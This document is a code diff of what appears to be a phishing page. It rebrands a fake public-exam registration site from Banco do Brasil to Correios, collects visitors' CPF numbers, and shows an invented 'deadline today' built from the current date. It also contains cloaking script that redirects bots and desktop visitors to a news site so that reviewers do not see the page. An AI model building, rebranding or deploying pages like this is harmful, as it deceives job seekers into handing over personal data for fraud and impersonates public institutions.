@@ -25,7 +25,6 @@
       // Redirecionar ou bloquear o acesso
       function checkAccess() {
         if (isBot() || (!isMobile() && isWideScreen())) {
-          // Redirecionar para o site G1 se o acesso for bloqueado
           window.location.href = "https://g1.globo.com/";
         }
       }
@@ -38,7 +37,7 @@
     </script> 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Inscrição Concurso 2025</title>
+    <title>Correios - Inscrição Concurso 2025</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -66,8 +65,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FFCC00',
                     }
                 }
             }
@@ -76,23 +75,23 @@
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
 
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-correios-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
                         CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="bg-bb-blue py-3 shadow-md">
+    <div class="bg-correios-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -107,10 +106,17 @@
     <div class="container mx-auto px-4 py-6">
         <div class="bg-yellow-50 border border-yellow-100 rounded-lg p-4 mb-6 shadow-sm">
             <div class="flex items-start">
-                <i class="fas fa-info-circle text-bb-blue text-xl mr-3 mt-0.5"></i>
+                <i class="fas fa-info-circle text-correios-blue text-xl mr-3 mt-0.5"></i>
                 <div>
-                    <p class="font-bold mb-2 text-bb-blue">INFORMAÇÕES IMPORTANTES</p>
-                    <p class="text-sm text-gray-700 leading-relaxed">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público do Banco do Brasil 2025. Para prosseguir com sua inscrição, informe seu CPF. O <span class="font-bold">prazo para as inscrições</span> se encerra <span class="font-bold">hoje, {{ current_day }}/{{ current_month }}/{{ current_year }}</span>. Após esta data, <span class="font-bold">não será possível</span> realizar novas inscrições.</p>
+                    <p class="font-bold mb-2 text-correios-blue">INFORMAÇÕES IMPORTANTES</p>
+                    <p class="text-sm text-gray-700 leading-relaxed">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público dos Correios 2025. Vagas disponíveis para os seguintes cargos:</p>
+                    <ul class="list-disc list-inside mt-2 text-sm text-gray-700 leading-relaxed ml-4">
+                        <li>Carteiro</li>
+                        <li>Atendente Comercial</li>
+                        <li>Operador de Triagem e Transbordo</li>
+                        <li>Suporte Administrativo</li>
+                    </ul>
+                    <p class="text-sm text-gray-700 mt-2">O <span class="font-bold">prazo para as inscrições</span> se encerra <span class="font-bold">hoje, {{ current_day }}/{{ current_month }}/{{ current_year }}</span>.</p>
                 </div>
             </div>
         </div>
@@ -119,12 +125,12 @@
     <div class="container mx-auto px-4 pb-8 flex-grow">
         <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
             <form id="inscricaoForm" method="POST" action="{{ url_for('consultar_cpf') }}">
-                <p class="mb-6 font-bold text-lg text-bb-blue">Dados para Inscrição:</p>
+                <p class="mb-6 font-bold text-lg text-correios-blue">Dados para Inscrição:</p>
                 <div class="space-y-6">
                     <div class="relative">
                         <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
                         <div class="relative">
-                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent transition duration-200"
+                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-correios-blue focus:border-transparent transition duration-200"
                                    id="cpf"
                                    name="cpf"
                                    type="text" 
@@ -137,7 +143,7 @@
                             </div>
                         </div>
                     </div>
-                    <button type="submit" id="submitBtn" class="bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
+                    <button type="submit" id="submitBtn" class="bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
                         <span>Prosseguir com a Inscrição</span>
                         <i class="fas fa-arrow-right ml-2"></i>
                     </button>
@@ -155,9 +161,9 @@
         </div>
     </div>
 
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
     </div>
 
     <script>
